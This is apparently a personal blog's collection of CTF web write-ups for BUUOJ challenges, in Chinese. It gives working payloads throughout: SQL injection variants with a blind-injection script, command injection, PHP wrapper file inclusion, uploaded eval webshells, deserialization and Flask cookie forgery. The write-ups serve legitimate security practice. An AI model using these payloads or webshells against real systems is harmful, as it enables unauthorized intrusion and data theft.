---
title: "buuoj刷题记录-web"
slug: "buuoj-web-wp"
description: "温故而知新，学他妈的"
date: 2022-01-17T23:41:35+08:00
categories: ["CTF"]
series: []
tags: ["wp"]
draft: false
toc: true
---

之前已经做了不少了，这里是个合集；这几天内要尽快刷完捏~

寒假要把go和java学了，之前学不明白的xss也该学学了！（早该了（

----

## page 01

{{% spoiler "[极客大挑战 2019]EasySQL" %}}

弱口令登入

`admin'or 1#: 12345`

{{% /spoiler %}}

{{% spoiler "[HCTF 2018]WarmUp" %}}

查看页面源码提示source.php

```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }
?>

```

`mb_substr`与`substr`用法一样

![image-20220117091202170](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220117091202170.png)

所以我们在参数内多加一个`?`即可，但是要注意urlencode，代码中有一次decode，本身还有一次decode，所以要encode两次

payload

```
/source.php?file=hint.php%253F../../../../../ffffllllaaaagggg
```

参考：[phpmyadmin4.8.1后台getshell](https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog)

同样的方式绕过waf登入数据库，创建名为一句话shell的表，包含对应路径的数据库文件得到shell

{{% /spoiler %}}

{{% spoiler "[极客大挑战 2019]Havefun" %}}

页面源码

```
$cat=$_GET['cat'];
        echo $cat;
        if($cat=='dog'){
            echo 'Syc{cat_cat_cat_cat}';
        }
```

payload

```
/?cat=dog
```

{{% /spoiler %}}

{{% spoiler "[ACTF2020 新生赛]Include" %}}

首页提示/?file=flag.php，文件包含点；尝试/etc/passwd，成功，/flag失败，尝试php伪协议

```
/?file=php://filter/convert.base64-encode/resource=flag.php
```

{{% /spoiler %}}

{{% spoiler "[强网杯 2019]随便注" %}}

```
1'
1' or '1
1' union select database()#
```

得到过滤条件

```
return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
```

使用堆叠注入

```
1';show tables;	# 两个表 1919810931114514, words
1';show columns from `1919810931114514`;	# 含flag列 但只回显2列
1';show columns from `words`;	# 回显3列id+data 都是空的
```

把`1919810931114514`表改名为`words`，flag改为id，即可回显对应的data

```
1';alter table words rename to amiz;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#
1' or '1	# 得到flag
```

————或者使用`set`&`prepare from`&`execute`的方式来堆叠

```
1';set @xx=concat('se','lect * from `1919810931114514`;');prepare x from @xx;execute x;#
```

回显过滤条件

```
strstr($inject, "set") && strstr($inject, "prepare")
```

用大写绕过

```
1';Set @xx=concat('se','lect * from `1919810931114514`;');Prepare x from @xx;execute x;#
```

{{% /spoiler %}}

{{% spoiler "[SUCTF 2019]EasySQL" %}}

```
1;show tables;	# Flag
1;show columns from Flag;	# 被过滤
```

由于没有完整的报错首先猜一下后端语句，输入非0数字回显为1，其余为空，推测后端有`||`输出0的情况

```
select $_POST['query'] || flag from Flag;
```

payload

```
*,1
# 相当于 select *,1 from Flag;
```

————或者使用堆叠，payload

```
1;set sql_mode=PIPES_AS_CONCAT;select 1
```

将`||`转变为`+`一样的连接字符

flag{4032c605-fa39-448d-aa2d-f35fca8d3fa9}

{{% /spoiler %}}

{{% spoiler "[ACTF2020 新生赛]Exec" %}}

payload

```
127.0.0.1;cat /flag
```

flag{f8c12653-ce6e-4eef-8f69-9433506d5adc}

{{% /spoiler %}}

{{% spoiler "[极客大挑战 2019]Secret File" %}}

页面源码提示/Archive_room.php，/end.php，/secr3t.php看到文件包含点，用伪协议

payload

```
/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php
```

flag{7719d9f9-6f2f-46f7-bc78-a82cfc52d470}

{{% /spoiler %}}

{{% spoiler "[极客大挑战 2019]LoveSQL" %}}

万能密码登入，得到密码是bd798bc32e819b4f57d4e1523d5834c6

```
admin' union select 1,2,3#		# 有3列
1' union select 1,database(),3#		# 回显位在2和3上 库名geek
1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database();#		# 表名geekuser, l0ve1ysq1
1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1';#	# id, username, password
1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1#
```

注意`group_concat()`是个函数，憋手欠加空格

flag{e210152f-fc19-4139-9d2a-dcbb6c4c6268}

{{% /spoiler %}}

{{% spoiler "[GXYCTF2019]Ping Ping Ping" %}}

```
127.0.0.1;ls	# index.php, flag.php
127.0.0.1;cat flag.php	# fxck your space!
127.0.0.1;cat$IFSindex.php	# 空内容
127.0.0.1;cat$IFSflag.php	# fxck your flag!
127.0.0.1;cat$IFS$7`ls`		# 页面源码得到flag
127.0.0.1;a=g;cat$IFS$7fla$a.php	# 页面源码得到flag
```

flag{281616ef-7318-42b6-adaf-825edf76ff26}

{{% /spoiler %}}

{{% spoiler "[极客大挑战 2019]Knife" %}}

白给shell，连蚁剑

flag{95a76aa0-58b5-4494-bb49-7f11ce00774d}

{{% /spoiler %}}

{{% spoiler "[极客大挑战 2019]Http" %}}

页面源码提示/Secret.php，跟着提示一直修改请求头

```
Referer: https://Sycsecret.buuoj.cn
User-Agent: Syclover
X-Forwarded-For: 127.0.0.1
```

flag{614f3098-1c0f-480b-97f7-9caa49025e83}

{{% /spoiler %}}

{{% spoiler "[极客大挑战 2019]Upload" %}}

过滤了几个常规的php后缀，用.php7绕过，同时抓包修改MIME为image/png

之后发现它会检测上传内容有没有`<?`，用gif+phtml样式的🐎

pure.phtml

```
GIF89a
<script language='php'>eval($_POST['amiz']);</script>
```

连蚁剑

flag{23be575a-679e-4f7c-b75b-6e033d10bfca}

{{% /spoiler %}}

{{% spoiler "[ACTF2020 新生赛]Upload" %}}

前端限制后缀白名单jpg, png, gif，删审查元素会删不掉已经注册了的回调函数，所以直接改后缀名上传，然后抓包改一下

pure.html

```
GIF89a
<script language='php'>eval($_POST['amiz']);</script>
```

连蚁剑

flag{a8ff29f2-5197-4599-a1c4-1e8b5f390a8c}

{{% /spoiler %}}

{{% spoiler "[RoarCTF 2019]Easy Calc" %}}

页面源码：I've set up WAF to ensure security.

num参数以get方式传入，不允许有字母；绕过方式`/calc.php  ?num=xyx`，加空格；还有`chr()`+ascii码

```python
tmp = str(input())
res = ''
for _ in tmp:
    res += f'chr({str(ord(_))}).'
print(res[:-1])
```

```
/calc.php? num=1;var_dump(scandir(chr(47)))		# 爆目录文件 f1agg
/calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
```

flag{4f1c0f5a-5a7b-4ad4-b7f4-9eb82de3f93f}

{{% /spoiler %}}

{{% spoiler "[极客大挑战 2019]PHP" %}}

备份文件泄露/www.zip，flag.php中得到flag

Syc{dog_dog_dog_dog}

{{% /spoiler %}}

{{% spoiler "[极客大挑战 2019]BabySQL" %}}

把union, select双写即可

```
admin' ununionion selselectect 1,2,3#
1' uunionnion sselectelect 1,2,group_concat(schema_name) ffromrom infoorrmation_schema.schemata%23	# 库名information_schema,mysql,performance_schema,test,ctf,geek
1' ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema='ctf'%23	# 表名 Flag
1' ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='Flag'		# 字段名flag
1' union select 1,2,group_concat(flag) from ctf.Flag	# ctf库Flag表的flag字段
```

flag{b6848383-f7d0-4cad-ad7d-98ab54790bbe}

可以写一个mini轮，用于sql语句双写（自己写的比较渣就不放了捏

{{% /spoiler %}}

{{% spoiler "[ACTF2020 新生赛]BackupFile" %}}

/index.php.bak

```php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}


```

看似比较复杂一点，但是if的比较是弱比较

payload

```
?key=123
```

flag{758691a1-017b-4033-899a-bd78281fbcc1}

{{% /spoiler %}}

{{% spoiler "[护网杯 2018]easy_tornado" %}}

/hint.txt：md5(cookie_secret+md5(filename))

/flag.txt：/fllllllllllllag

目标是找到cookie_secret，在报错页面发现可能的模板渲染

```
/error?msg={{handler.settings}}
```

得到cookie_secret: 13b08673-9199-47bc-b5a2-bb7938591e62

```
/file?filename=/fllllllllllllag&filehash=3725772b08f76e01024d81754c45f307
```

flag{5756e16a-885e-4009-83e1-653a4818a39a}

{{% /spoiler %}}

{{% spoiler "[极客大挑战 2019]BuyFlag" %}}

/pay.php，页面源码

```
~~~post money and password~~~
if (isset($_POST['password'])) {
	$password = $_POST['password'];
	if (is_numeric($password)) {
		echo "password can't be number</br>";
	}elseif ($password == 404) {
		echo "Password Right!</br>";
	}
}
```

`is_numeric`函数用`%20`绕过

```
password=404%20&money[]=100000000
Cookie: user=1
```

flag{a3cd1620-d3f7-45a9-8b3d-ace1ed21e7fb}

{{% /spoiler %}}

{{% spoiler "[HCTF 2018]admin" %}}

————非预期：admin: 123弱口令

————解法1：`ᴬᴰᴹᴵᴺ`unicode欺骗，注册`ᴬᴰᴹᴵᴺ: 456`的号，改密为999，登入

————解法2：看cookie是熟悉的flask-session，改密页面/change提示https://github.com/woadsl1234/hctf_flask/，拿到secret='ckj123'

```
python3 flask_session_cookie_manager3.py encode -s 'ckj123' -t "{'_fresh':True,'_id': b'Yjg0OGY3OWU1MTI4ZWNhNWU1YWFlZWJiYzg5ZGM1NWNkZTIxYzlkNWJmZjI0YzhkMzljYWE1YzFlZTQ4OWEzY2EwYjlmNGYzODU4OTA1MTA0M2E3MWQ3ODM0M2JmY2IxNjI4MGQxOTQwNThmZDFmODg2ODFlZTdhOTQ1ZGQ0YWM=','csrf_token': b'NGEwMDMxNmEyYzhlNzhkYWRiMTUwYjBiOWIwNGFmYzI1YTIxOTQzMg==','image': b'eWl6eA==','name':'amiz','user_id':'10'}"
```

flag{f479cd5d-4bc7-47a6-b6b2-be84ff250880}

注意这个脚本加密的时候的内部都是单引号，并且没有多余的花括号

{{% /spoiler %}}

{{% spoiler "[BJDCTF2020]Easy MD5" %}}

响应头有Hint: select * from 'admin' where password=md5($pass,true)

php中md5的第二个参数为true时输出16字符二进制，默认false输出32字符十六进制，也就是说这里返回raw md5

mysql中在进行布尔类型判断时，1开头的字符串会被当做int型

```
password='xxx'or'1xxx'
password='xxx'or 1
password='xxx'or'1'
password='xxx'or true	# 以上三者均返回true
password='xxx'or'0trash'	# false
```

raw md5包含很多字符，如果raw md5包含`'trash'or'1trash'`这样的，就会true，永真

一个参考payload是

```
ffifdyop
hash: 276f722736c95d99e921722cf9ed621c
```

爆破脚本

```
<?php
for ($i = 0;;) {
 for ($c = 0; $c < 1000000; $c++, $i++)
  if (stripos(md5($i, true), '\'or\'') !== false)
   echo "\nmd5($i) = " . md5($i, true) . "\n";
 echo ".";
}
?>
```

参考：[Leet More 2010 Oh Those Admins! writeup](http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/)

之后进入下一关，页面源码

```
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
```

数组绕过，payload

```
/levels91.php?a[]=1&b[]=2
```

进入下一关

```
<?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
}
```

依旧数组绕过，注意post

```
/levell14.php
param1[]=1&param2[]=2
```

flag{78df171e-faa3-4c31-922f-a1f532e06dac}

{{% /spoiler %}}

{{% spoiler "[ZJCTF 2019]NiZhuanSiWei" %}}

```
<?php
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit();
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

指定了`r`，用`data://`伪协议

```
/?text=data://text/plain,welcome to the zjctf&file=php://filter/convert.base64-encode/resource=useless.php
```

```
<?php

class Flag{  //flag.php
    public $file;
    public function __tostring(){
        if(isset($this->file)){
            echo file_get_contents($this->file);
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }
    }
}
?>

```

非常简单的反序列化

```
$a = new Flag();
$a->file = 'flag.php';
echo serialize($a);
```

payload

```
/?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

flag{0e255178-c131-4073-beb9-5821c29c0c3c}

{{% /spoiler %}}

{{% spoiler "[SUCTF 2019]CheckIn" %}}

传pure.phtml，对后缀检测，jpg会检测文件内容，考虑上传.user.ini

pure2.gif

```
GIF89a
<script language='php'>eval($_POST['amiz']);</script>
```

.user.ini

```
GIF89a
auto_prepend_file=pure2.gif
```

uploads/cc551ab005b2e60fbdc88de809b2c4b1

传的时候文件重名给远程环境整崩了，懒得重开了，寄

{{% /spoiler %}}

{{% spoiler "[极客大挑战 2019]HardSQL" %}}

之前几个分别用了万能密码，联合查询，双写，这次轮到报错注入了

过滤了`=`，换成`(a)like(b)`这样的

```
1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))),1))%23	# H4rDsq1
```

```
1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))),1))%23	# id,username,password
```

```
1'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))),1))%23
```

```
1'or(updatexml(1,concat(0x7e,(select(group_concat(right(password,25)))from(H4rDsq1))),1))%23
```

flag{64053c33-96f3-4bea-8e94-02fb81e48236}

{{% /spoiler %}}

{{% spoiler "[MRCTF2020]你传你🐎呢" %}}

传.htaccess

```
<FilesMatch "wuhu">
    SetHandler application/x-httpd-php
</FilesMatch>
```

/var/www/html/upload/fa75c48848aa00244f9317333bbbffe1/.htaccess

传wuhu.jpg

```
<?php eval($_POST['wuhu']);?>
```

/var/www/html/upload/fa75c48848aa00244f9317333bbbffe1/wuhu.jpg

连蚁剑，拿flag

flag{0188a589-fefe-4939-95d1-cbcc433fc9b2}

{{% /spoiler %}}

{{% spoiler "[MRCTF2020]Ez_bypass" %}}

排版问题，看页面源码

```
I put something in F12 for you
include 'flag.php';
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if(isset($_GET['gg'])&&isset($_GET['id'])) {
    $id=$_GET['id'];
    $gg=$_GET['gg'];
    if (md5($id) === md5($gg) && $id !== $gg) {
        echo 'You got the first step';
        if(isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd))
            {
                 if($passwd==1234567)
                 {
                     echo 'Good Job!';
                     highlight_file('flag.php');
                     die('By Retr_0');
                 }
                 else
                 {
                     echo "can you think twice??";
                 }
            }
            else{
                echo 'You can not get it !';
            }

        }
        else{
            die('only one way to get the flag');
        }
}
    else {
        echo "You are not a real hacker!";
    }
}
else{
    die('Please input first');
}
}Please input first
```

md5数组绕过，`is_numeric`绕过

```
/?id[]=1&gg[]=2
POST: passwd=1234567%20
```

flag{2d5c5d49-f8a2-471e-b3f0-8861a85e34a8}

{{% /spoiler %}}

{{% spoiler "[网鼎杯 2020 青龙组]AreUSerialz" %}}

```
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write(); // 文件写
        } else if($this->op == "2") {
            $res = $this->read();   // 文件读 读flag
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);  // 文件读
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")   // 强比较 $op=2 int类型绕过
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))  // 只允许大小写+数字+普通字符 即可见字符
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);   // 先过滤再反序列化
    }

}
```

坑点在于`private function`序列化之后会产生不可见字符，两种绕过方式：php7.1+版本对属性不敏感，本地构造payload时全改为public；或者将`%00*%00`改为十六进制的`\00*\00`，同时将序列化结果中的s改为S

这里用第一种，private全改public

```
$obj = new FileHandler();
$obj->op = 2;
$obj->filename = 'php://filter/convert.base64-encode/resource=flag.php';
echo serialize($obj);
```

payload

```
/?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:52:"php://filter/convert.base64-encode/resource=flag.php";s:7:"content";N;}
```

flag{0138599e-6ac8-4573-b448-e15635135f63}

{{% /spoiler %}}

{{% spoiler "[GXYCTF2019]BabySQli" %}}

页面源码提示：select * from user where username = '$name'；这说了跟没说一样，没告诉waf是啥

大写绕过

```
1'Order by 3%23	# 有3列
1'union select 1,2,3%23	# wrong user!
1'union select 1,'admin',3%23	# wrong pass! 说明用户名在第二列
```

我们采用的方式是联合查询 创建一行临时的新数据，以这个临时数据登入

```
name=1'union select 1,'admin','202cb962ac59075b964b07152d234b70'#&pw=123
```

flag{a544cd1d-4676-41d2-8110-837020cf11e5}

{{% /spoiler %}}

{{% spoiler "[GYCTF2020]Blacklist" %}}

跟qwb的随便注非常像，拿payload来试试

```
1';show tables;
1';show columns from `FlagHere`;
1';show columns from `words`;
```

```
1';Set @xx=concat('se','lect * from `FlagHere`;');Prepare x from @xx;execute x;
```

回显过滤条件

```
return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
```

用`handler on`代替`select`

```
1'; handler FlagHere open as amiz; handler amiz read first; handler amiz close;#
```

`handler...open`打开一个表，使其后续可以使用`handler...read`访问，并且在该会话`handler...close`或终止前不会关闭

flag{9ba3c903-1a8c-4a40-b32a-f9752251269c}

{{% /spoiler %}}

{{% spoiler "[CISCN2019 华北赛区 Day2 Web1]Hack World" %}}

长得跟前面的随便注和Blacklist很像，直接给出了flag在flag表flag列

拿fuzz字典过一遍，过滤了and or  union order group information，盲注py脚本走起，上二分

```
import requests

url = 'http://e59ccad4-7152-44b6-ab8f-c632bb29ac31.node4.buuoj.cn:81/index.php'
target = 'glzjin'
content = ''

for i in range(1, 40):
    left = 32
    right = 127
    mid = (left + right) // 2
    while right > left:
        payload = f"if(ascii(substr((select(flag)from(flag)),{i},1))>{mid},1,2)"
        data = {"id":payload}
        response = requests.post(url, data)
        if target in response.text:
            left = mid + 1
        else:
            right = mid
        mid = (left + right) // 2
    content += chr(int(mid))
    print(content)
```

 flag{1b79970-4e0-e-b78f-2d63d8c77375}

{{% /spoiler %}}

{{% spoiler "[网鼎杯 2018]Fakebook" %}}

/robots.txt提示/user.php.bak

```
<?php


class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

有个curl，反序列化点

```
$age = 18;
$blog = "file:///var/www/html/flag.php";
$name = "amiz";
$a = new UserInfo($name,$age,$blog);
echo serialize($a);
```

```
O:8:"UserInfo":3:{s:4:"name";s:4:"amiz";s:3:"age";i:18;s:4:"blog";s:29:"file:///var/www/html/flag.php";}
```

但是本身这玩意还得有个注入点，它在url最后的`no`参数处

```
/view.php?no=1 order by 4%23	# 5报错 共4列
```

不反序列化也行，它没过滤`load_file`直接就读文件了

```
/view.php?no=-1 union/**/select/**/1,load_file("/var/www/html/flag.php"),3,4%23
```

有点奇怪的，你说它过滤空格，但是前面那个不用注释也可以，而且前面参数是1还不行

{{% /spoiler %}}



